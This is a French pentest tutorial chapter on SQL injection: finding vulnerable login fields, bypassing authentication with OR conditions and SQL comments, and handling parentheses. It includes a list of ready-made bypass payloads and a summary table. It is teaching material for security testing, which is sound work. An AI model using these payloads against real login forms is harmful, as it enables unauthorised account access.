# Decouverte et bypass d'authentification

## Pourquoi

Avant d'exploiter une injection SQL, il faut d'abord confirmer que le point d'entree est vulnerable. Une fois la vulnerabilite confirmee, la premiere exploitation consiste souvent a contourner un mecanisme d'authentification. Ce chapitre couvre les techniques de decouverte et les bypass classiques avec `OR` et les commentaires SQL.

## Comment ca marche

### Detection de la vulnerabilite

On injecte des caracteres speciaux dans les champs de saisie et on observe la reponse :

| Payload | URL encode | Ce qu'on cherche |
|---|---|---|
| `'` | `%27` | Erreur SQL ou changement de comportement |
| `"` | `%22` | Erreur SQL |
| `#` | `%23` | Commentaire SQL (MySQL) |
| `;` | `%3B` | Fin de requete |
| `)` | `%29` | Fermeture de parenthese |

Si le serveur retourne une erreur SQL du type `You have an error in your SQL syntax`, le champ est vulnerable. Si la page se comporte differemment (pas d'erreur visible mais resultat change), c'est potentiellement une blind SQLi.

### Bypass avec OR

La requete d'authentification classique :

```sql
SELECT * FROM logins WHERE username='$user' AND password='$pass';
```

En injectant `admin' OR '1'='1` dans le champ username, la requete devient :

```sql
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something';
```

Pourquoi ca fonctionne : `AND` est evalue avant `OR`. Donc `'1'='1' AND password='something'` est evalue d'abord (resultat : `FALSE`), puis `username='admin' OR FALSE` est evalue (resultat : `TRUE` si admin existe).

### Bypass avec commentaires

Les commentaires SQL permettent d'ignorer le reste de la requete :

| Syntaxe | Type | Remarque |
|---|---|---|
| `-- ` | Commentaire de ligne | Necessite un espace apres les deux tirets |
| `#` | Commentaire de ligne | Specifique a MySQL |
| `/* */` | Commentaire en ligne | Moins utilise en SQLi |

En injectant `admin'-- -` dans le champ username :

```sql
SELECT * FROM logins WHERE username='admin'-- -' AND password='something';
```

Tout ce qui suit `-- ` est ignore. La requete ne verifie plus le mot de passe.

{% hint style="info" %}
Le `-- ` doit etre suivi d'un espace pour etre reconnu comme commentaire. En URL, l'espace est encode en `+`, d'ou le format courant `--+`. La convention `-- -` (avec un tiret supplementaire) rend l'espace visible.
{% endhint %}

{% hint style="info" %}
Le `#` dans une URL est interprete comme un fragment (ancre). Pour l'utiliser en injection via l'URL, il faut l'encoder : `%23`.
{% endhint %}

## En pratique

### Bypass simple avec OR

**Scenario** : formulaire de login avec username et password.

{% tabs %}
{% tab title="Username connu" %}
Si on connait un username valide (ex: `admin`) :

- Username : `admin' OR '1'='1`
- Password : n'importe quoi

La requete retourne le premier enregistrement correspondant a `admin`.
{% endtab %}

{% tab title="Username inconnu" %}
Si on ne connait pas de username valide, injecter dans les deux champs :

- Username : `' OR '1'='1`
- Password : `' OR '1'='1`

La requete retourne tous les enregistrements. L'application connecte generalement le premier utilisateur de la table (souvent l'admin).
{% endtab %}
{% endtabs %}

### Bypass avec commentaire

- Username : `admin'-- -`
- Password : n'importe quoi (ignore par le commentaire)

### Gestion des parentheses

Certaines requetes utilisent des parentheses pour grouper les conditions :

```sql
SELECT * FROM logins WHERE (username='$user' AND id > 1) AND password='$pass';
```

Injecter `admin'-- -` produit une erreur car la parenthese ouvrante n'est pas fermee. Il faut adapter le payload :

- Username : `admin')-- -`

La requete devient :

```sql
SELECT * FROM logins WHERE (username='admin')-- -' AND id > 1) AND password='...';
```

### Payloads d'auth bypass courants

```
' OR '1'='1'-- -
' OR '1'='1'#
' OR 1=1-- -
admin'-- -
admin'#
') OR ('1'='1
') OR ('1'='1'-- -
' OR ''='
```

{% hint style="success" %}
Une liste complete de payloads d'auth bypass est disponible dans le repo [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass). Chaque payload cible une structure de requete differente.
{% endhint %}

## Pieges et galeres

- Le nombre de guillemets doit rester pair pour eviter les erreurs de syntaxe. Soit on commente le reste de la requete, soit on ferme les guillemets avec une condition toujours vraie (`' OR '1'='1`).
- Si le mot de passe est hashe cote serveur avant la requete, l'injection dans le champ password est impossible. Il faut injecter dans le champ username.
- Les parentheses dans la requete originale doivent etre fermees correctement dans le payload. Observer le message d'erreur pour deduire la structure.
- L'injection ne fonctionne que si l'entree est inseree dans la requete sans sanitisation. Les prepared statements bloquent ces attaques.

## Retour terrain

Le bypass d'authentification par SQLi est l'un des tests les plus rapides et les plus gratifiants en pentest web. Un simple `'` dans le champ username suffit a detecter la vulnerabilite. En engagement, documenter la requete exacte qui declenche l'erreur et le payload qui contourne l'authentification. C'est la preuve d'impact la plus directe pour le rapport.

## Memo express

| Objectif | Payload |
|---|---|
| Detecter la vulnerabilite | `'` dans le champ username |
| Bypass avec OR (admin connu) | `admin' OR '1'='1` |
| Bypass avec commentaire | `admin'-- -` |
| Bypass sans connaitre l'admin | `' OR '1'='1'-- -` |
| Bypass avec parenthese | `admin')-- -` |
| Commentaire MySQL | `-- -` ou `#` (`%23` en URL) |

***
